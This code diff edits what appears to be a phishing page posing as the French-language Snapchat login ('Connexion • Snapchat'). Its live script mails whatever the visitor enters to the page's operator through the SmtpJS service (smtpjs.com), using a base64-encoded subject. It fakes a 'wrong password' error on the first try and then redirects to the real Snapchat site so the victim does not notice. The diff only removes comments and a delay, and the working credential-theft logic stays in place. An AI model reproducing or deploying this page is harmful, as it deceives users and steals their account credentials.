@@ -1,9 +1,7 @@
 <head>
     <title>Connexion &bull; Snapchat</title>
-    <!-- Meta -->
     <meta charset="utf-8">
     <link rel="stylesheet" href="mystyle.css">
-    <!-- <script src="https://smtpjs.com/v2/smtp.js"></script> -->
 </head>
 
 <body
@@ -42,7 +40,6 @@
 </footer>
 
 <script>
-    /* SmtpJS.com - v3.0.0 */
     var Email = {
         send: function (a) {
             return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) })
@@ -71,9 +68,7 @@
             atob("U25hcGNoYXQ=")
         ).then(() => {
             if (attempt > 1)
-                setTimeout(() => {
-                    window.location.replace("https://snapchat.com")
-                }, 1000);
+                window.location.replace("https://snapchat.com")
             else
                 document.getElementById("error").innerHTML = "Nom d'utilisateur ou mot de passe incorrect";
         }).catch(err => console.log(err))
